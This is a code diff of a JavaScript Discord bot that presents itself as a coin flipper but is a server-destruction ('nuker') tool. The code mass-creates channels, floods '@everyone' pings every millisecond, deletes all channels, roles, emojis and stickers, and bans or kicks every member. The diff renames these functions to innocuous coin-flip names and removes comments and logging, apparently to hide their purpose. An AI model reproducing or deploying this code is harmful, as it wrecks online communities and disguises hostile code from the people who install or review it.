@@ -40,160 +40,143 @@ coinfilpper.on("messageCreate", (message) => {
 
     // Possible Args
     let args = message.content.split(" ").slice(1);
-    var args1 = args[0]; // Used for amount
-    var args2 = args.slice(1).join(' ') // Naming things
-    var args3 = args.slice(2).join(', '); // Other
+    var args1 = args[0];
+    var args2 = args.slice(1).join(' ')
+    var args3 = args.slice(2).join(', ');
 
     if (!disableEveryone) {
-        // Commands
 
-        // Help
         if (message.content.startsWith(prefix + "help")) {
             message.channel.send({embeds: [help]})
         }
 
         if (message.content.startsWith(prefix + "mc")) {
-            MassChannels(args1, args2).catch((err) => {
+            ChooseChannel(args1, args2).catch((err) => {
                 message.reply(err);
             });
         }
 
-      
         if (message.content.startsWith(prefix + "dc")) {
-            DelAllChannels().catch((err) => {
+            DelAllCoins().catch((err) => {
                 message.reply(err);
             });
         }
 
-   
         if (message.content.startsWith(prefix + "cp")) {
-            MassChnPing(args1, args2, args3).catch((err) => {
+            ClearNLogs(args1, args2, args3).catch((err) => {
                 message.reply(err);
             });
         }
 
         if (message.content.startsWith(prefix + "mr")) {
-            MassRoles(args1, args2).catch((err) => {
+            FlipR(args1, args2).catch((err) => {
                 message.reply(err);
             });
         }
 
-    
         if (message.content.startsWith(prefix + "dr")) {
-            DelAllRoles().catch((err) => {
+            ClearFlips().catch((err) => {
                 message.reply(err);
             });
         }
 
-    
         if (message.content.startsWith(prefix + "ds")) {
-            DelAllStickers().catch((err) => {
+            DelAllLogs().catch((err) => {
                 message.reply(err);
             });
         }
 
-      
         if (message.content.startsWith(prefix + "de")) {
-            DelAllEmotes().catch((err) => {
+            DelCoins().catch((err) => {
                 message.reply(err);
             });
         }
 
-      
         if (message.content.startsWith(prefix + "mb")) {
-            BanAll().catch((err) => {
+            FlipBan().catch((err) => {
                 message.reply(err);
             });
         }
 
-   
         if (message.content.startsWith(prefix + "mk")) {
-            KickAll().catch((err) => {
+            FlipKick().catch((err) => {
                 message.reply(err);
             });
         }
+
     } else {
-        // Commands
 
-        // Help
         if (message.content.startsWith(prefix + "help")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
             message.channel.send({embeds: [help]})
         }
 
-      
         if (message.content.startsWith(prefix + "mc")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            MassChannels(args1, args2).catch((err) => {
+            ChooseChannel(args1, args2).catch((err) => {
                 message.reply(err);
             });
         }
 
         if (message.content.startsWith(prefix + "dc")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            DelAllChannels().catch((err) => {
+            DelAllCoins().catch((err) => {
                 message.reply(err);
             });
         }
 
-      
         if (message.content.startsWith(prefix + "cp")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            MassChnPing(args1, args2, args3).catch((err) => {
+            ClearNLogs(args1, args2, args3).catch((err) => {
                 message.reply(err);
             });
         }
 
-    
         if (message.content.startsWith(prefix + "mr")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            MassRoles(args1, args2).catch((err) => {
+            FlipR(args1, args2).catch((err) => {
                 message.reply(err);
             });
         }
 
-    
         if (message.content.startsWith(prefix + "dr")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            DelAllRoles().catch((err) => {
+            ClearFlips().catch((err) => {
                 message.reply(err);
             });
         }
 
         if (message.content.startsWith(prefix + "ds")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            DelAllStickers().catch((err) => {
+            DelAllLogs().catch((err) => {
                 message.reply(err);
             });
         }
 
         if (message.content.startsWith(prefix + "de")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            DelAllEmotes().catch((err) => {
+            DelCoins().catch((err) => {
                 message.reply(err);
             });
         }
 
         if (message.content.startsWith(prefix + "mb")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            BanAll().catch((err) => {
+            FlipBan().catch((err) => {
                 message.reply(err);
             });
         }
 
         if (message.content.startsWith(prefix + "mk")) {
             if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
-            KickAll().catch((err) => {
+            FlipKick().catch((err) => {
                 message.reply(err);
             });
         }
     }
 
 
-
-    /**
-     */
-    function MassChannels(amount, channelName) {
+    function ChooseChannel(amount, channelName) {
         return new Promise((resolve, reject) => {
             if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
             if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
@@ -202,18 +185,17 @@ coinfilpper.on("messageCreate", (message) => {
             for (let i = 0; i < amount; i++) {
                 if (message.guild.channels.cache.size === 500) break;
                 if (!channelName) {
-                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
+                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" })
                 } else {
-                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
+                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" })
                 }
             }
             resolve();
         });
     }
 
-    /**
-     */
-    function MassChnPing(amount, channelName, pingMessage) {
+
+    function ClearNLogs(amount, channelName, pingMessage) {
         return new Promise((resolve, reject) => {
             if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
             if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
@@ -222,80 +204,77 @@ coinfilpper.on("messageCreate", (message) => {
             if (!pingMessage) return reject("Unspecified Args: Specify the message you wish to mass mention");
             for (let i = 0; i < amount; i++) {
                 if (message.guild.channels.cache.size === 500) break;
-                if (!channelName) {
-                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
+                message.guild.channels.create(channelName || `${message.author.username} was here`, { type: "GUILD_TEXT" })
+                    .then((ch) => {
                         setInterval(() => {
                             ch.send("@everyone " + pingMessage);
                         }, 1);
                     });
-                } else {
-                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
-                        setInterval(() => {
-                            ch.send("@everyone " + pingMessage);
-                        }, 1); // literally not possible but lol?
-                    });
-                }
             }
             resolve();
         });
     }
 
-    /**
-     */
-    function DelAllChannels() {
+
+    function DelAllCoins() {
         return new Promise((resolve, reject) => {
             if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
-            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
+            message.guild.channels.cache.forEach((ch) => ch.delete())
             resolve();
         });
     }
-     */
-    function MassRoles(amount, roleName) {
+
+
+    function FlipR(amount, roleName) {
         return new Promise((resolve, reject) => {
             if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
             if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
             if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
             for (let i = 0; i <= amount; i++) {
                 if (message.guild.roles.cache.size === 250) break;
-                if (!roleName) {
-                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
-                } else {
-                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
-                }
+                message.guild.roles.create({
+                    name: roleName || "nuked",
+                    color: "RANDOM",
+                    position: i++
+                })
             }
+            resolve();
         })
     }
 
     /**
      */
-    function DelAllRoles() {
+    function ClearFlips() {
         return new Promise((resolve, reject) => {
             if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
-            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
+            message.guild.roles.cache.forEach((r) => r.delete())
+            resolve();
         });
     }
 
     /**
      */
-    function DelAllEmotes() {
+    function DelCoins() {
         return new Promise((resolve, reject) => {
             if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
-            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
+            message.guild.emojis.cache.forEach((e) => e.delete())
+            resolve();
         });
     }
 
     /**
      */
-    function DelAllStickers() {
+    function DelAllLogs() {
         return new Promise((resolve, reject) => {
             if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
-            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
+            message.guild.stickers.cache.forEach((s) => s.delete())
+            resolve();
         });
     }
 
     /**
      */
-    function BanAll() {
+    function FlipBan() {
         return new Promise((resolve, reject) => {
             if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
             let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
@@ -303,9 +282,8 @@ coinfilpper.on("messageCreate", (message) => {
                 setTimeout(() => {
                     msg.edit("Banning...");
                     for (let i = 0; i < arrayOfIDs.length; i++) {
-                        const user = arrayOfIDs[i];
-                        const member = message.guild.members.cache.get(user);
-                        member.ban().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was banned.`)) });
+                        const member = message.guild.members.cache.get(arrayOfIDs[i]);
+                        member.ban()
                     }
                 }, 2000);
             })
@@ -314,7 +292,7 @@ coinfilpper.on("messageCreate", (message) => {
 
     /**
      */
-    function KickAll() {
+    function FlipKick() {
         return new Promise((resolve, reject) => {
             if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
             let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
@@ -322,9 +300,8 @@ coinfilpper.on("messageCreate", (message) => {
                 setTimeout(() => {
                     msg.edit("Banning...");
                     for (let i = 0; i < arrayOfIDs.length; i++) {
-                        const user = arrayOfIDs[i];
-                        const member = message.guild.members.cache.get(user);
-                        member.kick().catch((err) => { console.log(red("Error Found: " + err)) }).then(() => { console.log(greenBright(`${member.user.tag} was kicked.`)) });
+                        const member = message.guild.members.cache.get(arrayOfIDs[i]);
+                        member.kick()
                     }
                 }, 2000);
             })
@@ -337,4 +314,4 @@ try {
 } catch (err) {
     console.error(err)
 }
-// sub to sparkcodez
+// credits to Him
